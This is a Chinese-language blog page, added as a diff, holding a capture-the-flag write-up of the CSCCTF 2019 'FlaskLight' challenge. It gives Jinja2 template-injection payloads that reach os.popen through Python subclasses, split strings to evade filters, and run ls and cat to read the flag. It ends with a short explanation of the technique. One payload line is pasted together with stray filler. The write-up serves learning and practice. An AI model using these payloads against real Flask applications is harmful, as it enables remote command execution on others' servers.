@@ -1,0 +1,245 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>[CSCCTF 2019 Qual]FlaskLight | why</title>
+    <meta name="author" content="why" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>WHY</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;WHY</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>[CSCCTF 2019 Qual]FlaskLight</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/26
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>查看源码</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/Picgo/image-20240526190918700.png" alt="image-20240526190918700"></p>
+<p>也就是说变量告诉我了，也告诉我通过get传递了</p>
+<p>所以？</p>
+<p>来吧，宝贝</p>
+<p>首先试了试sql注入，不行</p>
+<p>只能试试ssti</p>
+<p>这个是jinja2模型，还是不太熟练</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;[].__class__.__bases__[0].__subclasses__()[40]&#125;&#125;//已经可以读取文件了</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__bu&#x27;+&#x27;iltins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;os&#x27;).__dict__[&#x27;pop&#x27;+&#x27;en&#x27;](&#x27;ls&#x27;).read()&#125;&#125;//找一个可以执行命令的函数</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__bu&#x27;+&#x27;iltins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;os&#x27;).__dict__[&#x27;pop&#x27;+&#x27;en&#x27;](&#x27;ls&#x27;).read()&#125;&#125;//读取文件目录</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__bu&#x27;+&#x27;iltins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;os&#x27;).__dict__[&#x27;pop&#x27;+&#x27;en&#x27;](&#x27;ls /flasklight&#x27;).read()&#125;&#125;xxxxxxxxxx &#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__bu&#x27;+&#x27;iltins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;os&#x27;).__dict__[&#x27;pop&#x27;+&#x27;en&#x27;](&#x27;ls /flasklight&#x27;).read()&#125;&#125;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__[%27__glo%27+%27bals__%27][%27__bu%27+%27iltins__%27][%27__imp%27+%27ort__%27](%27os%27).__dict__[%27pop%27+%27en%27](%27ls%20/flasklight/coomme_geeeett_youur_flek%27).read()&#125;&#125;//猜测当前目录在flasklight下</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__[%27__glo%27+%27bals__%27][%27__bu%27+%27iltins__%27][%27__imp%27+%27ort__%27](%27os%27).__dict__[%27pop%27+%27en%27](%27cat%20/flasklight/coomme_geeeett_youur_flek%27).read()&#125;&#125;//拿到flag</span><br></pre></td></tr></table></figure>
+
+<h4 id="jinja2模版的ssti"><a href="#jinja2模版的ssti" class="headerlink" title="jinja2模版的ssti"></a>jinja2模版的ssti</h4><p>在Python环境下，<code>.__class__</code>获取对应实例的类，<code>.__mro__</code>获取当前对象的所有继承类</p>
+<p>得到所有类的父类<code>object</code>后，使用方法<code>__subclasses__()</code>查看所有类对象。</p>
+<p>并找到了<code>warnings.catch_warnings</code>模块，通过该模块可以访问<code>os</code>模块。</p>
+<p>因此，试图通过访问<code>os</code>模块执行命令查找根目录下的FLAG。</p>
+<p><code>__init__</code>将对象实例化</p>
+<p><code>__globals__</code>引用包含函数全局变量的字典</p>
+<p>在<code>__builtins__</code>下有<code>eval</code>、<code>__import＿＿</code>等全局函数</p>
+<p>尝试导入<code>os</code>然后执行cmd命令</p>
+<p><code>ls</code>执行成功说明环境基于Linux</p>
+<p>使用<code>cat</code>访问<code>/flag</code>即可得到FLAG</p>
+<p>例子观察以上题目payload</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 why
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;why
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+<script src="/js/<file>"></script>
+<link rel="stylesheet" href="/css/<file>" />
+</body>
+</html>
